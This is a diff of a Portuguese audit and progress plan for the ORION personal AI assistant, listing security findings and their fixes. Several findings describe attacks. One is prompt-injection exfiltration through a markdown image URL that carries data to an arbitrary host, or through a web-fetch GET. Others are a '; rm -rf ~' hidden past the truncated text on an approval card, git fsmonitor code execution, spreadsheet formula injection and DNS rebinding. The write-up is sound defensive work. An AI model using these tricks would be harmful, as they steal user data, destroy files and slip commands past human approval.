@@ -1,7 +1,7 @@
 # ORION — Plano de melhorias e o que foi feito
 
 > Auditoria de 02/10/2026 (backend, front, regras, docs) e a execução dela, mais a segunda
-> rodada de 03/10/2026 (achados R1–R11 abaixo). Cada achado tem ID, evidência e status. O que
+> rodada de 03/10/2026 (achados R1–R11) e a terceira de 06/10/2026 (L1–L10: login, MCP, ferramentas). Cada achado tem ID, evidência e status. O que
 > **não** foi verificado está na seção própria.
 > Regras resultantes: [ORION_REGRAS.md](ORION_REGRAS.md). Plano de fases: [ORION_NUCLEO.md](ORION_NUCLEO.md).
 
@@ -24,7 +24,7 @@ Legenda: ✅ resolvido e testado · 🟡 parcial · ⏳ depende de você ou de f
 | E1 | Média | Sem CI nem testes unitários | ✅ | `.github/workflows/ci.yml` (Linux, Windows, macOS) + 270 testes Python + 18 em Node |
 | E2 | Média | Só Windows, caminhos `C:\Orion` fixos, `requirements` com pywin32/torch | 🟡 | Pacote novo é portável (`platformdirs`, caminhos por config). Legado segue Windows por desenho até a fase 7 |
 | E3 | Média | Globals, `ChatRouter` com 22 argumentos, `on_event` deprecado | ✅ (novo) | `create_app` com lifespan e `AppState` injetado |
-| E4 | Baixa | `script.js` monolítico, `innerHTML` sem teste | ✅ | Front redesenhado em módulos (03/10/2026): 7 puros testados em Node (89 testes) + 77 testes de navegador (fluxos, segurança, mobile, axe). Ver [ORION_FRONT.md](ORION_FRONT.md) |
+| E4 | Baixa | `script.js` monolítico, `innerHTML` sem teste | ✅ | Front redesenhado em módulos (03/10/2026): 7 puros testados em Node (89 testes) + 86 testes de navegador (fluxos, segurança, entrada, janela estreita, axe). Ver [ORION_FRONT.md](ORION_FRONT.md) |
 | E5 | Baixa | Drift de docs, `.gitignore`, `requirements` | 🟡 | Corrigidos. A pasta `Orion_Ollama/` **não** foi renomeada (o `.bat`, o boot e o README apontam para ela; sai na fase 7) |
 | E6 | Média | RAG sem avaliação (HR 10%, MRR 0.057) | ✅ | `orion.memory.eval` + conjunto fixo em pytest; CLI para as **suas** perguntas reais |
 | F1 | Média | *(achado durante a execução)* o chat renderizava `![x](https://host-qualquer/?d=…)` do modelo: exfiltração por prompt injection | ✅ | Só imagem de `/imagens/<arquivo>`; 18 testes em Node, com checagem de que falham no código antigo |
@@ -40,12 +40,29 @@ Revisão do plano (NUCLEO §6–7) contra o código e o CI. Corte e operação: 
 | R3 | Média | Importar sem informar o nome antigo do assistente marcava todas as respostas antigas como `system` (fora da busca) sem aviso | ✅ | Aviso no `import-surreal` e no `verify-export` listando os atores que viram `system` |
 | R4 | Média | Sem plano de corte: depois da venda o legado não roda e o novo ainda não tem canais | ✅ (decisões suas pendentes) | [ORION_CORTE.md](ORION_CORTE.md): blocos A e B, critérios, rollback, o que decidir |
 | R5 | Média | Sem agendador: lembretes e agendamentos migrados não teriam quem os disparasse; embeddings sem cliente; backup sem agendamento; sem consolidação | ✅ (embeddings e consolidação só com falsos) | `orion/jobs.py`, `GeminiEmbedder`, `Consolidator`, fila `/notifications`, backup diário em `ORION_BACKUP_DIR`, `ORION_VAULT_DIR` |
-| R6 | Média | Host fora de `127.0.0.1` (Tailscale) podia ser liberado sem login | ✅ | Regra 17: a configuração recusa subir sem `ORION_ADMIN_TOKEN` |
+| R6 | Média | Host fora de `127.0.0.1` (Tailscale) podia ser liberado sem login | ✅ | Regra 17: o app recusa subir sem login (desde 06/10: senha **ou** `ORION_ADMIN_TOKEN`) |
 | R7 | Baixa | `httpx` era importado em tempo de execução mas só declarado no grupo `dev`; docs defasadas ("CI remoto não rodou", fase 6 "só md.js") | ✅ | Dependência movida; docs sincronizadas; triagem das 55 ferramentas em [ORION_FERRAMENTAS.md](ORION_FERRAMENTAS.md) |
 | R8 | Alta | O plano dizia que o bot do Telegram do legado lia o `/chat` novo "sem mudança": falso. O `/chat` novo exige `Authorization: Bearer` e o bot do legado não envia (401); o teste só provava o formato do SSE | ✅ (API falsa) | Canal novo `orion/channels/telegram.py`: default-deny, aprovação por botão, fila de avisos; regra 21 |
 | R9 | Média | Sem `autostart` e sem ferramentas para agir no computador no núcleo novo | ✅ (Windows só no argv) | `orion autostart` (gera, não ativa) e `orion-desktop` v0 opt-in; ler segredo/chave agora confirma (regra 22) |
 | R10 | Baixa | O `httpx` registra a URL em INFO, e a URL da API do Telegram carrega o token; campo `args` duplicado em `Approval` | ✅ | Logger do `httpx`/`httpcore` em WARNING (com teste); campo duplicado removido |
 | R11 | Alta | O cartão de aprovação escondia o fim de comandos longos: o front cortava cada argumento em 700 caracteres e o servidor em 2000, então um comando com enchimento podia esconder `; rm -rf ~` depois do corte e o Antônio aprovaria sem ver | ✅ | `args_truncated` no evento e em `/approvals`; web e Telegram só deixam **negar** o que não cabe inteiro; a interface mostra o argumento sem cortar; regra 23 |
+
+## Terceira rodada (06/10/2026): login, MCP e as ferramentas que faltavam
+
+Tudo testado no Linux (CI nos três sistemas no PR). Cada item novo abaixo tem regra em [ORION_REGRAS.md](ORION_REGRAS.md).
+
+| ID | Sev. | Achado (evidência) | Status | Como |
+|---|---|---|---|---|
+| L1 | Alta | Só havia um token estático (`ORION_ADMIN_TOKEN`) colado no navegador: sem senha, sem sessão, sem como sair, token no `localStorage` | ✅ | Login com senha (PBKDF2-SHA256, 600 mil iterações), sessão opaca e revogável em cookie `httpOnly` + `SameSite=Strict`, bloqueio crescente por cliente e global, CSRF por `Origin`, `orion set-password`, tela de entrada no front (e2e + axe). O hash fica em `auth.db`, **fora** do backup que vai para a nuvem. Regra 25 |
+| L2 | Média | `/health` devolvia componentes e contagens, e `/docs`, `/redoc` e `/openapi.json` mapeavam a API, tudo sem login | ✅ | `/health` sem login só diz `status` e `version`; os três da documentação foram desligados |
+| L3 | Média | A decisão da política só ia para o log: nada para consultar, nada que sobrevivesse a um reinício | ✅ | Tabela `audit` (esquema v3, migração automática); falha ao gravar nega o que não é leitura (regra 8, agora provada com o banco); `consultar_audit_log`; poda de 90 dias |
+| L4 | Média | Sem cliente MCP: a fase 4 dependia de escrever tudo à mão | ✅ (servidor real só o de teste) | `orion/mcp_client.py` com o SDK oficial: a classe de risco vem do `mcp.json` e nunca do servidor, o que não for classificado confirma, `allow` esconde o resto, o servidor não herda `ORION_*` nem segredos. `orion mcp-check`. Regra 24 |
+| L5 | Alta | *(achado ao portar `consultar_git`)* `git status` executa o `core.fsmonitor` do `.git/config` do repositório: um repositório baixado da web vira execução de programa | ✅ | Git com `core.fsmonitor=false`, pager, diff externo e `GIT_*` do ambiente desligados; teste com um repositório malicioso de verdade |
+| L6 | Média | *(achado ao portar `gerar_documento`)* planilha gravada pelo modelo com texto começando em `=` virava **fórmula** quando o Antônio abrisse o arquivo | ✅ | Texto é sempre gravado como texto (`data_type='s'`), testado ida e volta com `openpyxl` |
+| L7 | Média | O `url_guard` do legado conferia o DNS e deixava a biblioteca resolver de novo ao conectar (janela de DNS rebinding) | ✅ | `orion/netguard.py`: o IP conferido é o IP usado (Host e SNI do nome original), cada redirecionamento revalidado, tamanho limitado, HTML vira texto |
+| L8 | Baixa | `abrir_app` era "escrita com log", mas abre qualquer programa ou arquivo | ✅ | Passou a execução: sempre confirma |
+| L9 | Média | Um `buscar_url` depois de ler uma página injetada pode exfiltrar dados na própria URL (GET), e o taint só cobre escrita e execução | 🟡 | As ferramentas de web ficam **desligadas por padrão** (`ORION_WEB_TOOLS`); o endereço passa pelo `netguard` e fica no audit. O canal continua existindo: está documentado em `orion/tools/web.py` |
+| L10 | Baixa | Telegram só entendia texto | ✅ (API falsa) | Voz (Whisper no Groq, o texto entendido aparece antes da resposta) e foto (imagem só naquele turno) |
 
 ## O que foi construído (por fase do NUCLEO)
 
@@ -55,9 +72,9 @@ Revisão do plano (NUCLEO §6–7) contra o código e o CI. Corte e operação: 
 | 1 — fundação | `pyproject` (uv, ruff, pyright, pytest), `orion.config`, logging JSON, `/health`, CLI, CI Win+macOS | ✅ (CI verde em Linux, Windows e macOS na `main`) |
 | 2 — cérebro | `orion.gateway` (API OpenAI-compat., streaming, fallback, quarentena em 429), `orion.agent` (persona + memória + ferramentas sob política), `orion.delegate` (claude/codex/gemini), `POST /chat` | ✅ com gateway e CLIs **falsos**; ⏳ OmniRoute e CLIs reais |
 | 3 — memória | SQLite + FTS5 + vetores (numpy) com RRF, fatos editáveis, vault, backup/restore (`orion backup`, `orion restore`), eval, **importador completo do export** (esquema v2), lembretes/agendamentos/tarefas/números/prompts/grafo, fila de avisos, jobs, `GeminiEmbedder`, consolidação | ✅ no código; ⏳ chave de embeddings e suas perguntas reais |
-| 4 — ferramentas | Política (classes de risco, aprovações, taint, audit); ferramentas de memória, operação e `delegar`; triagem das 55 do legado | 🟡 faltam servidores MCP e `orion-desktop` |
-| 5 — canais | `/approvals` com token; canal Telegram novo e `orion autostart` (só API/sistema falsos); login e Tailscale **não** | 🟡 |
-| 6 — interface/voz | Front redesenhado em 03/10 (só desktop, [ORION_FRONT.md](ORION_FRONT.md)); voz não começou | 🟡 |
+| 4 — ferramentas | Política (classes de risco, aprovações, taint, audit em banco); memória, operação e `delegar`; `orion-desktop` completo (arquivos, documentos, sistema, processos, vigilância) e web (opt-ins); cliente MCP; 31 das 55 portadas | ✅ no código; ⏳ servidores MCP reais (e-mail, agenda, navegador) e o que depende de modelo multimodal |
+| 5 — canais | Login com senha e tela de entrada; canal Telegram com voz e foto; `orion autostart`; guia do Tailscale em [ORION_OPERACAO.md](ORION_OPERACAO.md) | ✅ no código (Telegram só API falsa); ⏳ instalar o Tailscale e ativar no notebook |
+| 6 — interface/voz | Front redesenhado em 03/10 (só desktop, [ORION_FRONT.md](ORION_FRONT.md)) com tela de entrada desde 06/10; voz no Telegram sim, voz ao vivo e palavra de ativação não | 🟡 |
 | 7 — limpeza | Nada apagado: o legado ainda é a única coisa rodando com seus dados | ⏳ |
 
 ## Decisões que tomei por você (reverta se discordar)
@@ -101,8 +118,20 @@ Revisão do plano (NUCLEO §6–7) contra o código e o CI. Corte e operação: 
   teste ao vivo é seu.
 - **Embeddings reais:** a busca vetorial foi testada com um embedder falso (sinônimos). Falta o cliente da API
   gratuita (Gemini) e medir com suas perguntas reais — o conjunto de avaliação existe para isso.
-- **Front:** carrega no Chromium headless sem erro; não testei dentro do pywebview, nem acessibilidade, nem o grafo 3D.
-- `/mcp`, CORS `null` e o REST do legado continuam sem login até a fase 5 (já documentado no README).
+- **Front:** testado no Chromium (fluxos, teclado, axe nas telas e na tela de entrada); não testei dentro do pywebview
+  nem o grafo 3D. O app desktop (pywebview) segue entrando por token (`get_config`), não pela tela de senha.
+- **Login em uso real:** testado com cliente de teste e Chromium; não testei atrás do `tailscale serve` (HTTPS). Lá o
+  endereço do cliente que o servidor vê é sempre `127.0.0.1`, então o bloqueio por cliente vira um bloqueio global.
+- **MCP:** testado com um servidor de verdade (o do próprio SDK) por stdin/stdout em Linux. Os pacotes e os nomes de
+  ferramentas do `mcp.example.json` (filesystem, fetch, git, Playwright) são de memória: rode `orion mcp-check`.
+  Nenhum servidor de Google Workspace foi escolhido.
+- **Voz e foto no Telegram:** só contra API falsa. O formato de `getFile` e do `audio/transcriptions` do Groq é por
+  memória da documentação. A foto só funciona se o modelo do gateway aceitar imagem.
+- **`pesquisar_com_ia`:** o formato do `generateContent` com `google_search` e o nome do modelo (`gemini-2.5-flash`)
+  são de memória e não foram testados contra a API real.
+- **Ferramentas do desktop no Windows e no macOS:** notificação (balão do PowerShell, `osascript`), área de transferência,
+  abrir app e processos em segundo plano só têm o argv testado nesses sistemas; os comandos reais rodaram no Linux.
+- `/mcp`, CORS `null` e o REST do **legado** continuam sem login (o legado sai na fase 7).
 
 ## Próximos passos (em ordem)
 
@@ -113,9 +142,12 @@ Revisão do plano (NUCLEO §6–7) contra o código e o CI. Corte e operação: 
    `tests/eval_pessoal.local.json` (modelo em `tests/eval_pessoal.example.json`); medir com
    `python -m orion.memory.eval <casos> --db <orion.db> --embeddings --min-hit-rate 0.8`.
 4. Subir o OmniRoute e testar `ORION_GATEWAY_URL`/`ORION_GATEWAY_MODEL` com `POST /chat`.
-5. Fase 5: criar o bot (@BotFather), preencher `ORION_TELEGRAM_TOKEN`/`ORION_TELEGRAM_ALLOWED_USERS` e testar no notebook (pare o bot do legado antes); depois login e Tailscale; `uv run orion autostart`.
-6. Fase 4: servidores MCP (navegador, Google) e `orion-desktop`, cada ferramenta com classe em `orion/policy/classes.py`;
-   a ordem e o destino de cada uma estão em [ORION_FERRAMENTAS.md](ORION_FERRAMENTAS.md).
+5. Fase 5: `uv run orion set-password`; criar o bot (@BotFather), preencher `ORION_TELEGRAM_TOKEN`/`ORION_TELEGRAM_ALLOWED_USERS`
+   (e `ORION_TRANSCRIBE_API_KEY` para voz) e testar no notebook (pare o bot do legado antes); instalar o Tailscale
+   ([ORION_OPERACAO.md](ORION_OPERACAO.md)); `uv run orion autostart`.
+6. Fase 4: copiar `mcp.example.json` para `mcp.json`, ligar os servidores que quiser e conferir com `uv run orion mcp-check`;
+   ligar `ORION_DESKTOP_TOOLS` (e, se quiser, `ORION_WEB_TOOLS`). O que ainda falta de cada ferramenta está em
+   [ORION_FERRAMENTAS.md](ORION_FERRAMENTAS.md).
 7. Decidir o que o [plano de corte](ORION_CORTE.md) deixa em aberto (data da venda, ferramentas mínimas, dias em paralelo).
 
 ## Ideias que sobraram (valor/custo)
